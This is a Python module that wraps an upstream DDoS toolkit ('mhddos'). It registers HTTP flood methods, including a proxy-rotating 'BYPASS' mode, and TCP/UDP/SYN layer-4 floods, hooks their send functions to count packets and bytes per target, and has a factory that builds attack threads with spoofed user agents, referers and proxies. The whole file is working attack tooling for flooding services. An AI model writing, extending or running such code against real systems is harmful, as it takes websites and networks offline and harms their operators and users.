from __future__ import annotations

import threading
from contextlib import suppress
from random import choice as randchoice
from typing import Any, Dict, Optional, Set

from requests import Session

from ..upstream.mhddos.start import HttpFlood, Layer4, Tools as UpstreamTools

L4_METHODS = frozenset({"TCP", "UDP", "SYN"})


class Capability:
    NONE = 0
    NEEDS_PROXY = 1 << 0
    L7 = 1 << 1
    L4 = 1 << 2
    AMPLIFY = 1 << 3


METHOD_REGISTRY: Dict[str, dict] = {
    "GET": {"cls": HttpFlood, "fn": "GET", "caps": Capability.L7},
    "POST": {"cls": HttpFlood, "fn": "POST", "caps": Capability.L7},
    "STRESS": {"cls": HttpFlood, "fn": "STRESS", "caps": Capability.L7},
    "SLOW": {"cls": HttpFlood, "fn": "SLOW", "caps": Capability.L7},
    "GSB": {"cls": HttpFlood, "fn": "GSB", "caps": Capability.L7},
    "BYPASS": {"cls": HttpFlood, "fn": "BYPASS", "caps": Capability.L7 | Capability.NEEDS_PROXY},
    "TCP": {"cls": Layer4, "fn": "TCP", "caps": Capability.L4},
    "UDP": {"cls": Layer4, "fn": "UDP", "caps": Capability.L4},
    "SYN": {"cls": Layer4, "fn": "SYN", "caps": Capability.L4},
}


def _payload_len(payload: Any) -> int:
    if isinstance(payload, (bytes, bytearray)):
        return len(payload)
    return len(str(payload).encode())


def _record_stats(
    stats_dict: dict,
    stats_lock: threading.Lock,
    target_key: str,
    packets: int,
    byte_count: int,
) -> None:
    with stats_lock:
        entry = stats_dict.setdefault(target_key, [0, 0])
        entry[0] += packets
        entry[1] += byte_count


def _install_stats_hooks(
    instance: threading.Thread,
    *,
    target_key: str,
    stats_dict: dict,
    stats_lock: threading.Lock,
) -> None:
    cls = type(instance)
    orig_send = cls._raw_send
    orig_sendto = cls._raw_sendto

    def hooked_send(self, sock, payload):
        sent = orig_send(self, sock, payload)
        if sent:
            _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
        return sent

    def hooked_sendto(self, sock, payload, target):
        sent = orig_sendto(self, sock, payload, target)
        if sent:
            _record_stats(stats_dict, stats_lock, target_key, 1, _payload_len(payload))
        return sent

    instance._raw_send = hooked_send.__get__(instance, cls)
    instance._raw_sendto = hooked_sendto.__get__(instance, cls)

    if isinstance(instance, HttpFlood):

        def bypass_with_stats():
            pro = None
            if instance._proxies:
                pro = randchoice(instance._proxies)
            with suppress(Exception), Session() as session:
                for _ in range(instance._rpc):
                    if pro:
                        with session.get(
                            instance._target.human_repr(),
                            proxies=pro.asRequest(),
                        ) as response:
                            _record_stats(
                                stats_dict,
                                stats_lock,
                                target_key,
                                1,
                                UpstreamTools.sizeOfRequest(response),
                            )
                            continue
                    with session.get(instance._target.human_repr()) as response:
                        _record_stats(
                            stats_dict,
                            stats_lock,
                            target_key,
                            1,
                            UpstreamTools.sizeOfRequest(response),
                        )

        instance.BYPASS = bypass_with_stats
        if "BYPASS" in instance.methods:
            instance.methods["BYPASS"] = bypass_with_stats


def make_attack_thread(
    method: str,
    *,
    target_key: str,
    stats_dict: dict,
    stats_lock: threading.Lock,
    synevent: threading.Event,
    l4_target: Optional[tuple] = None,
    thread_id: Optional[int] = None,
    url=None,
    host: Optional[str] = None,
    rpc: int = 1,
    useragents: Optional[Set[str]] = None,
    referers: Optional[Set[str]] = None,
    proxies: Optional[Set] = None,
) -> threading.Thread:
    spec = METHOD_REGISTRY[method]
    fn_name = spec["fn"]
    cls = spec["cls"]

    if cls is Layer4:
        instance = cls(
            target=l4_target,
            method=fn_name,
            synevent=synevent,
            proxies=proxies,
        )
    else:
        instance = cls(
            thread_id=thread_id or 0,
            target=url,
            host=host,
            method=fn_name,
            rpc=rpc,
            synevent=synevent,
            useragents=useragents,
            referers=referers,
            proxies=proxies,
        )

    _install_stats_hooks(
        instance,
        target_key=target_key,
        stats_dict=stats_dict,
        stats_lock=stats_lock,
    )
    return instance
